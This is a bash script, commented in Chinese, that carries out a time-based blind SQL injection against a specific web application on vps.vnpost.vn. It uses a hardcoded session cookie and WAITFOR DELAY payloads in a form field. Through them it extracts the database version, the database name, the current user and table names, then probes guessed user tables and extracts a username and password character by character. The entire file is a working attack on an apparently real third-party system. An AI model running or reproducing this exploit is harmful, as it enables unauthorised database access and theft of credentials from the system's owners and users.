#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 验证SQL注入 - 提取真实数据"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

get_viewstate() {
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: $COOKIE" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[验证1] 提取数据库版本"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

extract_string() {
    local query=$1
    local max_len=$2
    local result=""
    
    echo -n "  提取中: "
    
    for pos in $(seq 1 $max_len); do
        found=0
        
        # 测试常见字符（优化速度）
        for char in {a..z} {A..Z} {0..9} ' ' '.' '-' '(' ')' '\\'; do
            ascii=$(printf '%d' "'$char")
            
            # 时间盲注payload
            PAYLOAD="11'; IF (ASCII(SUBSTRING((${query}),${pos},1))=${ascii}) WAITFOR DELAY '00:00:01'--"
            
            get_viewstate
            
            start=$(date +%s%N)
            curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
                -X POST \
                -H "Cookie: $COOKIE" \
                --data-urlencode "__VIEWSTATE=$VS" \
                --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
                --data-urlencode "__EVENTVALIDATION=$EV" \
                --data-urlencode "txtThang=${PAYLOAD}" \
                --data-urlencode "txtNam=2025" \
                --data-urlencode "btnExport=Export" \
                -o /dev/null 2>&1
            end=$(date +%s%N)
            
            elapsed=$(( (end - start) / 1000000 ))
            
            if [ $elapsed -gt 800 ]; then
                result="${result}${char}"
                echo -n "$char"
                found=1
                break
            fi
        done
        
        # 如果这个位置没找到字符，说明结束了
        if [ $found -eq 0 ]; then
            break
        fi
    done
    
    echo ""
    echo "  结果: $result"
    echo "$result"
}

VERSION=$(extract_string "SELECT @@VERSION" 50)

echo ""
echo "  🔥 数据库版本: $VERSION"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[验证2] 提取当前数据库名"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

DBNAME=$(extract_string "SELECT DB_NAME()" 30)

echo ""
echo "  🔥 数据库名: $DBNAME"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[验证3] 提取当前用户"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

USER=$(extract_string "SELECT SYSTEM_USER" 30)

echo ""
echo "  🔥 数据库用户: $USER"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[验证4] 提取表名"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  枚举前5个表..."

for i in {0..4}; do
    echo ""
    echo "  表 $((i+1)):"
    
    TABLE=$(extract_string "SELECT TOP 1 name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name) AS rn, name FROM sys.tables) AS t WHERE rn=${i}" 30)
    
    if [ -n "$TABLE" ]; then
        echo "    🔥 $TABLE"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[验证5] 检查用户表并提取数据"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 尝试常见用户表名
USER_TABLES=("Users" "User" "tblUser" "Account" "Member" "Login" "Admin")

for table in "${USER_TABLES[@]}"; do
    echo ""
    echo "  测试表: $table"
    
    # 检查表是否存在（时间盲注）
    PAYLOAD="11'; IF EXISTS(SELECT * FROM ${table}) WAITFOR DELAY '00:00:01'--"
    
    get_viewstate
    
    start=$(date +%s%N)
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${PAYLOAD}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o /dev/null 2>&1
    end=$(date +%s%N)
    
    elapsed=$(( (end - start) / 1000000 ))
    
    if [ $elapsed -gt 800 ]; then
        echo "    🔥🔥🔥 表 $table 存在！"
        
        # 提取第一条用户名
        echo "    提取第一个用户..."
        USERNAME=$(extract_string "SELECT TOP 1 username FROM ${table}" 30)
        echo "    用户名: $USERNAME"
        
        # 提取第一条密码
        echo "    提取密码..."
        PASSWORD=$(extract_string "SELECT TOP 1 password FROM ${table}" 50)
        echo "    密码: $PASSWORD"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 验证完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "📊 提取的信息:"
echo "  数据库版本: $VERSION"
echo "  数据库名: $DBNAME"
echo "  当前用户: $USER"
